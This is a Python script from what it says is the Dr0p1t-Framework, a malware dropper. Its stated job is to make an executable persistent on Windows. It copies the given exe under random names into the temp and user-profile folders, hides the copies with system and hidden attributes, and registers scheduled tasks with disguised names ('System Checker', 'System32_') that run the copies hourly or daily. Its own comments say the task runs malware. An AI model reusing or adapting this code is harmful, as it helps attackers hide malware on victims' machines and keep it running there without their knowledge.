#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to to add your exe file to task scheduler
#Start

from os import popen
from random import randint

def random_name():
    return "Y" + str(randint(10,100))

def make_copy_and_hide( old,new ):
    old_file = open( old,"rb" )
    new_file = open( new,"wb" )
    old_data = old_file.read()
    new_file.write( old_data )
    old_file.close()
    new_file.close()
    blahah = popen( "attrib +s +h " + new ) #hiding the file

#Create a task to to run the malware at specific times
def create_checker(exe):
    x = popen("echo %temp%")
    path1 = "\\".join( str( x.read().strip() ).split( "\\" )[:-1] )
    new_name1 = random_name()
    full_path1 = path1 + "\\" + new_name1 + ".exe"
    make_copy_and_hide( exe,full_path1 )

    x = popen("echo %USERPROFILE%")
    new_name2 = random_name()
    full_path2 = x.read().strip() + "\\" + new_name2 + ".exe"
    make_copy_and_hide( exe,full_path2 )

    if "System Checker" not in popen("schtasks /query").read().strip(): # Will Start every hour at the same time
        blah = popen( 'SCHTASKS /CREATE /SC HOURLY /TN "System Checker" /TR {} >nul'.format( full_path1 ) )

    elif "System32_" not in popen("schtasks /query").read().strip():  # Different name , path and runs every day not every hour
        blah = popen( 'SCHTASKS /CREATE /SC daily /TN "System32_" /TR {} >nul'.format( full_path2 ) )

create_checker(File)
